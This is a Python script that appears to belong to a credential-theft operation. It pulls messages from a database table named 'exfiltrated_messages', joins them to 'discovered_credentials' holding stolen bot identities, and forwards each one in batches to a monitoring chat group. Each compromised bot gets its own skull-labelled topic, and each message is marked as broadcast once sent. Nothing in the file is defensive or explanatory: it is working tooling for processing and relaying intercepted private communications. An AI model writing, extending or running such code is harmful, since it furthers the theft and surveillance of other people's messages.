import asyncio
import sys
import os
import time

# Add project root to sys.path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from app.core.database import db
from app.services.broadcaster_srv import broadcaster_service
from app.core.config import settings

async def run_manual_broadcast():
    print("🚀 Starting LOCAL MANUAL BROADCAST...")
    print(f"   Target Group ID: {settings.MONITOR_GROUP_ID}")
    print("-------------------------------------------------")
    
    total_sent = 0
    batch_size = 50
    
    while True:
        # Fetch batch
        try:
            response = db.table("exfiltrated_messages")\
                .select("*, discovered_credentials!inner(meta)")\
                .eq("is_broadcasted", False)\
                .order("created_at")\
                .limit(batch_size)\
                .execute()
            
            messages = response.data
        except Exception as e:
            print(f"❌ DB Error: {e}")
            break
            
        if not messages:
            print("✅ No more pending broadcasts.")
            break
            
        print(f"📦 Processing batch of {len(messages)} messages...")
        
        for msg in messages:
            try:
                cred_id = msg["credential_id"]
                cred_info = msg.get("discovered_credentials", {})
                meta = cred_info.get("meta", {}) if cred_info else {}
                
                # Determine Topic
                # Determine Topic
                base_name = meta.get("bot_username") or meta.get("bot_name") or f"Cred-{cred_id[:8]}"
                topic_name = f"💀 @{base_name}"
                
                # Ensure Topic
                thread_id = await broadcaster_service.ensure_topic(settings.MONITOR_GROUP_ID, topic_name)
                
                # Send
                await broadcaster_service.send_message(settings.MONITOR_GROUP_ID, thread_id, msg)
                
                # Update DB
                db.table("exfiltrated_messages").update({"is_broadcasted": True}).eq("id", msg["id"]).execute()
                total_sent += 1
                
                print(f"   📤 Sent msg {msg['id']} -> Topic: {topic_name}")
                
                # Rate limit
                await asyncio.sleep(2.0) 
                
            except Exception as e:
                print(f"   ❌ Error sending msg {msg['id']}: {e}")
                # Optional: mark as error? 
                
        # Small pause between batches
        time.sleep(1)

    print("-------------------------------------------------")
    print(f"🏁 Broadcast Complete. Total Sent: {total_sent}")

if __name__ == "__main__":
    asyncio.run(run_manual_broadcast())
